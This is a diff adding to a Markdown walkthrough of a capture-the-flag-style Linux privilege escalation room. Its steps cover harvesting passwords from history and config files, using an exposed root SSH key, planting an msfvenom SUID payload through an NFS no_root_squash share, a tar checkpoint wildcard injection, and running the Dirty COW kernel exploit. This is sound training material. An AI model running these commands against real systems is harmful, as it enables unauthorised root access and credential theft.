@@ -301,13 +301,13 @@ Invalid command 'root:$6$bxwJfzor$MUhUWO0MUgdkWfPPEydqgZpm.YtPMI/gaM4lVqhP21LFNW
 
 ## Task 8: Cron Jobs - File Permissions
 
-* Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.
+* __Cron jobs__ are programs or scripts which users can schedule to run at specific times or intervals. __Cron table__ files (__crontabs__) store the configuration for cron jobs. The system-wide crontab is located at __/etc/crontab__.
 
 * View the contents of the system-wide crontab:
 
 ```cat /etc/crontab```
 
-* There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.
+* There should be two cron jobs scheduled to run every minute. One runs __overwrite.sh,__ the other runs __/usr/local/bin/compress.sh__.
 
 * Locate the full path of the overwrite.sh file:
 
@@ -363,7 +363,7 @@ chmod +xs /tmp/rootbash
 
 ```/tmp/rootbash -p```
 
-* Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!
+> __Remember to remove the modified code, remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!__
 
 ```bash
 rm /tmp/rootbash
@@ -376,7 +376,7 @@ exit
 * What is the value of the PATH variable in /etc/crontab?
 
 ```
-
+/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 ```
 
 
@@ -389,6 +389,7 @@ exit
 > Note that the tar command is being run with a wildcard (\*) in your home directory.
 
 * Take a look at the __GTFOBins__ page for tar.
+
 > Note that __tar__ has command line options that let you run other commands as part of a checkpoint feature.
 
 * Use __msfvenom__ on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
@@ -414,7 +415,7 @@ touch /home/user/--checkpoint-action=exec=shell.elf
 
 ```nc -nvlp 4444```
 
-* Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:
+> __Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:__
 
 ```bash
 rm /home/user/shell.elf
@@ -610,3 +611,213 @@ exit
 ```No answer needed```
 
 
+## Task 16: Passwords & Keys - History Files
+
+* If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.
+
+* View the contents of all the hidden history files in the user's home directory:
+
+```bash
+cat ~/.*history | less
+```
+
+> Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!
+
+* Switch to the root user, using the password:
+
+```bash
+su root
+```
+
+> __Remember to exit out of the root shell before continuing!__
+
+
+---
+
+* Answer the questions below
+* What is the full mysql command the user executed?
+
+```
+mysql -h somehost.local -uroot -ppassword123
+```
+
+
+## Task 17: Passwords & Keys - Config Files
+
+* Config files often contain passwords in plaintext or other reversible formats.
+
+* List the contents of the user's home directory:
+
+```bash
+ls /home/user
+```
+
+> Note the presence of a __myvpn.ovpn__ config file. View the contents of the file:
+
+```bash
+cat /home/user/myvpn.ovpn
+```
+
+* The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:
+
+```bash
+su root
+```
+
+> __Remember to exit out of the root shell before continuing!__
+
+---
+
+* Answer the questions below
+* What file did you find the root user's credentials in?   
+
+```
+/etc/openvpn/auth.txt
+```
+
+
+## Task 18: Passwords & Keys - SSH Keys
+
+* Sometimes users make backups of important files but fail to secure them with the correct permissions.
+
+* Look for hidden files & directories in the system root:
+
+```bash
+ls -la /
+```
+
+> Note that there appears to be a hidden directory called .ssh. View the contents of the directory:
+
+```bash
+ls -l /.ssh
+```
+
+> Note that there is a world-readable file called __root_key__. Further inspection of this file should indicate it is a __private SSH key__. The name of the file suggests it is for the root user.
+
+* Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:
+
+```bash
+chmod 600 root_key
+```
+
+* Use the key to login to the Debian VM as the root account:
+
+```bash
+ssh -i root_key root@10.10.85.244
+```
+
+> __Remember to exit out of the root shell before continuing!__
+
+---
+
+* Answer the questions below
+* Read and follow along with the above.
+
+```No answer needed```
+
+
+## Task 19: NFS
+
+* Files created via __NFS__ inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
+
+* Check the NFS share configuration on the Debian VM:
+
+```bash
+cat /etc/exports
+```
+
+> Note that the /tmp share has root squashing disabled.
+
+* On your Kali box, switch to your root user if you are not already running as root:
+
+```bash
+sudo su
+```
+
+* Using Kali's root user, create a mount point on your Kali box and mount the __/tmp__ share (update the IP accordingly):
+
+```bash
+mkdir /tmp/nfs
+mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
+```
+
+* Still using Kali's root user, generate a payload using __msfvenom__ and save it to the mounted share (this payload simply calls /bin/bash):
+
+```bash
+msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+```
+
+* Still using Kali's root user, make the file executable and set the SUID permission:
+
+```bash
+chmod +xs /tmp/nfs/shell.elf
+```
+
+* Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:
+
+```
+/tmp/shell.elf
+```
+
+> __Remember to exit out of the root shell before continuing!__
+
+---
+
+* Answer the questions below
+* What is the name of the option that disables root squashing?
+
+```
+no_root_squash
+```
+
+
+## Task 20: Kernel Exploits
+
+* __Kernel__ exploits can leave the system in an unstable state, which is why you should only run them as a last resort.
+
+* Run the Linux Exploit Suggester 2 tool to identify potential kernel exploits on the current system:
+
+```bash
+perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
+```
+
+* The popular Linux kernel exploit "__Dirty COW__" should be listed. Exploit code for __Dirty COW__ can be found at __/home/user/tools/kernel-exploits/dirtycow/c0w.c__. It replaces the SUID file __/usr/bin/passwd__ with one that spawns a shell (a backup of _/usr/bin/passwd_ is made at _/tmp/bak_).
+
+* Compile the code and run it (note that it may take several minutes to complete):
+
+```bash
+gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
+./c0w
+```
+
+* Once the exploit completes, run ```/usr/bin/passwd``` to gain a root shell:
+
+```
+/usr/bin/passwd
+```
+
+> __Remember to restore the original /usr/bin/passwd file and exit the root shell before continuing!__
+
+```bash
+mv /tmp/bak /usr/bin/passwd
+exit
+```
+
+---
+
+* Answer the questions below
+* Read and follow along with the above.
+
+```No answer needed```
+
+
+## Task 21: Privilege Escalation Scripts
+
+* Several tools have been written which help find potential privilege escalations on Linux. Three of these tools have been included on the Debian VM in the following directory: ```/home/user/tools/privesc-scripts```
+
+---
+
+* Answer the questions below
+* Experiment with all three tools, running them with different options. Do all of them identify the techniques used in this room?
+
+```No answer needed```
